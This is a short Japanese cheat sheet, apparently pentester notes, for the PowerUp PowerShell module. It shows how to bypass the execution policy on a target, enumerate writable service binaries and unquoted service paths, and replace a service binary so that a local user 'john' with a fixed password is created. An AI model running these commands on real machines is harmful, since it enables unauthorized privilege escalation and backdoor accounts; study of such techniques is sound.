# PowerUp
[Documentation]()

ターゲット上に.ps1を転送して、ターゲットのPowerShell上で以下のコマンドを実行すると、PowerShell上でPowerUpをインポートしてモジュールを使えるようになる。  
書き換え可能なバイナリファイルの調査等に便利。
　　
```.ps1
powershell -ep bypass
. .\PowerUp.ps1
```


## コマンド集
1. 書き換え可能なサービスとバイナリファイルのフルパスを表示する
```.ps1
Get-ModifiableServiceFile
```

2. Unquoted-Serviceの脆弱性がある可能性のあるバイナリとサービスを列挙する
```.ps1
Get-UnquotedService
```

3. GammbaServiceというサービスのパスに、Current.exeのバイナリファイルを書き込む。  
デフォルトではjohnユーザがパスワードPassword123!で作られる。
```.ps1
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
```